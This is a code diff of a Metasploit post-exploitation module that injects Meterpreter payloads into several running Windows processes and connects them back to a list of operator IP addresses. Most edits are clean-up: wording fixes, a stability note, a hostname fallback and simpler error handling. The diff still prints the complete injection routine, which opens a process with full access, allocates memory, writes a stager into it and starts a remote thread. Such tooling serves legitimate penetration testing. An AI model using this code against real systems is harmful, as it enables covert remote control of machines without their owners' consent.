@@ -11,12 +11,12 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Windows Manage Inject in Memory Multiple Payloads',
         'Description' => %q{
-          This module will inject in to several processes a given
-          payload and connecting to a given list of IP Addresses.
-          The module works with a given lists of IP Addresses and
-          process PIDs if no PID is given it will start a the given
+          This module will inject into several processes a given
+          payload and connect to a given list of IP addresses.
+          The module works with a given lists of IP addresses and
+          process IDs if no PID is given it will start the given
           process in the advanced options and inject the selected
-          payload in to the memory of the created module.
+          payload into the memory of the created module.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Post
           'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
         ],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter'],
+        'SessionTypes' => ['meterpreter'],
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -35,6 +35,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_thread_create
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -57,17 +62,18 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
     unless session.platform == 'windows' && [ARCH_X64, ARCH_X86].include?(session.arch)
       print_error('This module requires native Windows meterpreter functions not compatible with the selected session')
       return
     end
+
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
+
     # Set variables
     multi_ip = nil
     multi_pid = nil
-
-    print_status("Running module against #{sysinfo['Computer']}")
 
     if datastore['HANDLER']
       create_multi_handler(datastore['PAYLOAD'], datastore['LPORT'])
@@ -96,20 +102,19 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
   def inject(target_pid, payload_to_inject)
     print_status("Injecting meterpreter into process ID #{target_pid}")
-    begin
-      host_process = session.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
-      raw = payload_to_inject.generate
-      mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
 
-      print_status("Allocated memory at address #{'0x%.8x' % mem}, for #{raw.length} byte stager")
-      print_status('Writing the stager into memory...')
-      host_process.memory.write(mem, raw)
-      host_process.thread.create(mem, 0)
-      print_good("Successfully injected Meterpreter in to process: #{target_pid}")
-    rescue ::Exception => e
-      print_error("Failed to Inject Payload to #{target_pid}!")
-      print_error(e.message)
-    end
+    host_process = session.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
+    raw = payload_to_inject.generate
+    mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
+
+    print_status("Allocated memory at address #{'0x%.8x' % mem}, for #{raw.length} byte stager")
+    print_status('Writing the stager into memory...')
+    host_process.memory.write(mem, raw)
+    host_process.thread.create(mem, 0)
+    print_good("Successfully injected Meterpreter into process: #{target_pid}")
+  rescue StandardError => e
+    print_error("Failed to inject payload into #{target_pid}!")
+    print_error(e.message)
   end
 
   # Function for Creation of Connection Handler
